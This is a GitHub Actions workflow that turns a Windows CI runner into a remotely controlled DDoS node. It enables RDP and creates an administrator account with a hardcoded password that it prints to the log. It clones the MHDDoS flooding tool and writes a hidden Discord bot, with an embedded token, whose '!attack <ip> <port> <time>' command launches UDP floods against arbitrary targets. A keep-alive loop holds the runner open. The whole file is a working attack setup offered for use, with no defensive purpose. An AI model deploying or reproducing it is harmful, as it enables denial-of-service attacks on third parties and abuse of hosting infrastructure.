name: RDP

on:
  workflow_dispatch:

jobs:
  secure-rdp:
    runs-on: windows-latest
    timeout-minutes: 3600

    steps:
      - name: Enable RDP
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1

      - name: Create User
        run: |
          $Password = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force
          New-LocalUser "rdpuser" -Password $Password -FullName "RDP User" -Description "RDP Access"
          Add-LocalGroupMember -Group "Administrators" -Member "rdpuser"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "rdpuser"

      - name: Get IP Address
        run: |
          $IP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.PrefixOrigin -eq 'Dhcp'}).IPAddress
          Write-Output "IP Address: $IP"
          Write-Output "Username: rdpuser"
          Write-Output "Password: P@ssw0rd123!"

      - name: Install Dependencies
        run: |
          python -m pip install --upgrade pip
          python -m pip install discord.py requests

      - name: Setup MHDDoS
        run: |
          cd $env:USERPROFILE
          git clone https://github.com/MHProDev/MHDDoS.git
          cd MHDDoS
          python -m pip install -r requirements.txt

      - name: Create Bot Script
        shell: pwsh
        run: |
          $code = @'
          import discord
          import asyncio
          import subprocess
          import os

          TOKEN = 'MTQzMDYyNzc2OTMxNzk4NjM4NQ.G_VIV5.otgPTwQ92MRF-gzXUhVtcT4WOLCwggjAeD0nuk'

          intents = discord.Intents.default()
          intents.message_content = True
          client = discord.Client(intents=intents)

          processes = []

          @client.event
          async def on_ready():
              print(f'Logged in as {client.user}')

          @client.event
          async def on_message(message):
              if message.author == client.user:
                  return
              
              if message.content.startswith('!attack'):
                  parts = message.content.split()
                  if len(parts) != 4:
                      await message.channel.send('Usage: !attack <ip> <port> <time>')
                      return
                  
                  ip = parts[1]
                  port = parts[2]
                  time = parts[3]
                  
                  await message.channel.send(f'Starting attack on {ip}:{port} for {time}s')
                  
                  try:
                      mhddos_path = os.path.join(os.environ['USERPROFILE'], 'MHDDoS')
                      proc = await asyncio.create_subprocess_shell(
                          f'python start.py UDP {ip}:{port} 5 {time}',
                          cwd=mhddos_path,
                          stdout=asyncio.subprocess.PIPE,
                          stderr=asyncio.subprocess.PIPE
                      )
                      processes.append(proc)
                      await message.channel.send('Attack started!')
                  except Exception as e:
                      await message.channel.send(f'Error: {str(e)}')
              
              elif message.content == '!stop':
                  for proc in processes:
                      proc.terminate()
                  processes.clear()
                  await message.channel.send('All attacks stopped!')

          client.run(TOKEN)
          '@
          $code | Out-File -FilePath "$env:USERPROFILE\bot.py" -Encoding utf8

      - name: Start Bot
        run: |
          Start-Process python -ArgumentList "$env:USERPROFILE\bot.py" -WindowStyle Hidden

      - name: Keep Alive
        run: |
          while($true) {
            Write-Host "Server is running..."
            Start-Sleep -Seconds 60
          }
